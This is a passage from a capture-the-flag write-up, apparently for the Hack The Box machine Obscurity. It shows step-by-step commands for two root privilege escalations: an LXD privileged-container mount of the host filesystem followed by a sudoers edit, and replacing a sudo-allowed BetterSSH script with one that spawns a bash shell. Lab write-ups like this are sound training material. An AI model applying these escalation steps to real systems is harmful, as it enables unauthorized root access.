+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/opt/lxd-alpine-builder#</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">alpine-v3.11-x86_64-20200505_1324.tar.gz  build-alpine  LICENSE  README.md
+</span></code></pre></div></div>
+<p>Now <code class="language-plaintext highlighter-rouge">scp</code> that to Obscurity:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>sshpass <span class="nt">-p</span> SecThruObsFTW scp /opt/lxd-alpine-builder/alpine-v3.11-x86_64-20200505_1324.tar.gz robert@10.10.10.168:/tmp/
+</code></pre></div></div>
+<p>Now, back on Obscurity, I’ll import the image:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span>lxc image import /tmp/alpine-v3.11-x86_64-20200505_1324.tar.gz <span class="nt">--alias</span> 0xdf-image
+<span class="go">Image imported with fingerprint: 75ba5f4ed31cecabcadbea321745eae02775b612a1993a2ee53146e0e32ce77d
+</span><span class="gp">robert@obscure:~$</span><span class="w"> </span>lxc image list
+<span class="go">+------------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
+|   ALIAS    | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
++------------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
+| 0xdf-image | 75ba5f4ed31c | no     | alpine v3.11 (20200505_13:24) | x86_64 | 3.09MB | May 5, 2020 at 5:28pm (UTC) |
++------------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
+</span></code></pre></div></div>
+<p>I can try to start the image now, but there’s an error about no storage pools:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span>lxc init 0xdf-image container-0xdf <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true</span>
+<span class="go">Creating container-0xdf
+Error: No storage pool found. Please create a new storage pool
+</span></code></pre></div></div>
+<p>To fix this, run <code class="language-plaintext highlighter-rouge">lxd init</code> (and accept all the defaults):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span>lxd init
+<span class="go">Would you like to use LXD clustering? (yes/no) [default=no]: 
+Do you want to configure a new storage pool? (yes/no) [default=yes]: 
+Name of the new storage pool [default=default]: 
+Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]: 
+Create a new BTRFS pool? (yes/no) [default=yes]: 
+Would you like to use an existing block device? (yes/no) [default=no]: 
+Size in GB of the new loop device (1GB minimum) [default=15GB]: 
+Would you like to connect to a MAAS server? (yes/no) [default=no]: 
+Would you like to create a new local network bridge? (yes/no) [default=yes]: 
+What should the new bridge be called? [default=lxdbr0]: 
+What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
+What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
+Would you like LXD to be available over the network? (yes/no) [default=no]: 
+Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
+Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:
+</span></code></pre></div></div>
+<p>Now, I’ll start the image again. The options breaks down to:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">init</code> - action to take, starting a container</li>
+<li><code class="language-plaintext highlighter-rouge">0xdf-image</code> - the image to start</li>
+<li><code class="language-plaintext highlighter-rouge">container-0xdf</code> - the alias for the running container</li>
+<li><code class="language-plaintext highlighter-rouge">-c security.privileged=true</code> - by default, containers run as a non-root UID; this runs the container as root, giving it access to the host filesystem as root</li>
+</ul>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span>lxc init 0xdf-image container-0xdf <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true</span>
+<span class="go">Creating container-0xdf
+</span></code></pre></div></div>
+<p>Now, I’ll add the local system root to the container, mapped as <code class="language-plaintext highlighter-rouge">/mnt/root</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span>lxc config device add container-0xdf device-0xdf disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root
+<span class="go">Device device-0xdf added to container-0xdf
+</span></code></pre></div></div>
+<p>Now the container is setup and ready, just not running:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span>lxc list
+<span class="go">+----------------+---------+------+------+------------+-----------+
+|      NAME      |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
++----------------+---------+------+------+------------+-----------+
+| container-0xdf | STOPPED |      |      | PERSISTENT | 0         |
++----------------+---------+------+------+------------+-----------+
+</span></code></pre></div></div>
+<p>I’ll start the container:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span>lxc start container-0xdf 
+<span class="gp">robert@obscure:~$</span><span class="w"> </span>lxc list 
+<span class="go">+----------------+---------+---------------------+----------------------------------------------+------------+-----------+
+|      NAME      |  STATE  |        IPV4         |                     IPV6                     |    TYPE    | SNAPSHOTS |
++----------------+---------+---------------------+----------------------------------------------+------------+-----------+
+| container-0xdf | RUNNING | 10.245.20.75 (eth0) | fd42:d14:134e:59b3:216:3eff:fe48:a2e2 (eth0) | PERSISTENT | 0         |
++----------------+---------+---------------------+----------------------------------------------+------------+-----------+
+</span></code></pre></div></div>
+<p>Now I’ll get a shell inside the container:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span>lxc <span class="nb">exec </span>container-0xdf /bin/sh
+<span class="gp">~ #</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root)
+</span><span class="gp">~ #</span><span class="w"> </span><span class="nb">hostname</span> 
+<span class="go">container-0xdf
+</span></code></pre></div></div>
+<p>The host root file system is at <code class="language-plaintext highlighter-rouge">/mnt/root</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/mnt/root #</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">bin             cdrom           etc             initrd.img      lib             lost+found      mnt             proc            run             snap            swap.img        tmp             var             vmlinuz.old
+boot            dev             home            initrd.img.old  lib64           media           opt             root            sbin            srv             sys             usr             vmlinuz
+</span></code></pre></div></div>
+<p>I can read <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/mnt/root/root #</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">512fd442************************
+</span></code></pre></div></div>
+<p>There are many ways to turn this into a root shell on the host. For example, I can edit <code class="language-plaintext highlighter-rouge">/etc/sudoers</code> to add a second line for robert. I will need to <code class="language-plaintext highlighter-rouge">chmod +w sudoers</code> first (and ideally <code class="language-plaintext highlighter-rouge">chmod -w sudoers</code> once I’m done), as it’s currently set to not writable, even by owner.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">robert ALL=(ALL) NOPASSWD:/usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+robert ALL=(ALL) NOPASSWD:/bin/bash 
+</span></code></pre></div></div>
+<p>Now I can exit the container, and run <code class="language-plaintext highlighter-rouge">sudo bash</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/mnt/root/etc #</span><span class="w"> </span><span class="nb">exit</span>
+<span class="gp">robert@obscure:~$</span><span class="w"> </span><span class="nb">sudo</span> /bin/bash
+<span class="gp">root@obscure:~#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></div>
+<p>This was patched at some (unknown) point since December 2019 by removing the robert user from the lxd group.</p>
+<h3 id="path-5-move-betterssh-directory">Path 5: Move BetterSSH Directory</h3>
+<p>When I originally posted this writeup, <a href="https://twitter.com/ATeamJKR">jkr</a> replied:</p>
+<blockquote class="twitter-tweet"><p dir="ltr" lang="en">Four ways to root and yet there is a fifth one: Move the BetterSSH folder out of the way and create your own BetterSSH directory with a proper script 🤪</p>— jkr (@ATeamJKR) <a href="https://twitter.com/ATeamJKR/status/1259143066868420609?ref_src=twsrc%5Etfw">May 9, 2020</a></blockquote>
+<script async="" src="https://platform.twitter.com/widgets.js"></script>
+<p>I took a quick look, and it’s a good lesson on Linux permissions.</p>
+<p>There are two sets of permissions that matter here. The home directory of robert, <code class="language-plaintext highlighter-rouge">/home/robert</code>, and the permissions on the directory <code class="language-plaintext highlighter-rouge">BetterSSH</code> in that directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:/home$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-ld</span> robert/
+<span class="go">drwxr-xr-x 8 robert robert 4096 May  9 18:47 robert/
+
+</span><span class="gp">robert@obscure:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-ld</span> BetterSSH
+<span class="go">drwxrwxr-x 2 robert robert 4096 May  9 18:47 BetterSSH
+</span></code></pre></div></div>
+<p>To delete a directory, I have to either empty it and run <code class="language-plaintext highlighter-rouge">rmdir</code>, or run <code class="language-plaintext highlighter-rouge">rm -rf</code> on it. Both of these require my getting access to the files in the directory, which I do no have (they are owned by root). However, to rename directory A within directory B, all that matters is the permissions of the directory B, specifically that I have write (<code class="language-plaintext highlighter-rouge">w</code>) permissions (and enter permissions (<code class="language-plaintext highlighter-rouge">x</code>)). But in this case, as robert, I have <code class="language-plaintext highlighter-rouge">rwx</code>.</p>
+<p>In practice, if I try to remove the directory, it fails:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span><span class="nb">rm</span> <span class="nt">-rf</span> BetterSSH/
+<span class="go">rm: cannot remove 'BetterSSH/BetterSSH.py': Permission denied
+</span></code></pre></div></div>
+<p>If I just move it, it works fine:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span><span class="nb">mv </span>BetterSSH<span class="o">{</span>,-old<span class="o">}</span>
+<span class="gp">robert@obscure:~$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">BetterSSH-old  check.txt  out.txt  passwordreminder.txt  SuperSecureCrypt.py  user.txt
+</span></code></pre></div></div>
+<p>I used one of my favorite command line shortcuts, where <code class="language-plaintext highlighter-rouge">BetterSSH{,-old}</code> is the same as <code class="language-plaintext highlighter-rouge">BetterSSH BetterSSH-old</code>.</p>
+<p>Now I can create a new <code class="language-plaintext highlighter-rouge">BetterSSH</code> directory, and put my own <code class="language-plaintext highlighter-rouge">BetterSSH.py</code> script into it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span><span class="nb">mkdir </span>BetterSSH
+<span class="gp">robert@obscure:~$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'#!/usr/bin/env python3\n\nimport pty\n\npty.spawn("bash")'</span>
+<span class="gp">#</span><span class="o">!</span>/usr/bin/env python3
+<span class="go">
+import pty
+
+pty.spawn("bash")
+</span><span class="gp">robert@obscure:~$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'#!/usr/bin/env python3\n\nimport pty\n\npty.spawn("bash")'</span> <span class="o">&gt;</span> BetterSSH/BetterSSH.py 
+</code></pre></div></div>
+<p>Now I can run with <code class="language-plaintext highlighter-rouge">sudo</code> and get a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span><span class="nb">sudo</span> /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+<span class="gp">root@obscure:~#</span><span class="w"> 
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2020/05/09/htb-obscurity.html"></a>
+</article>
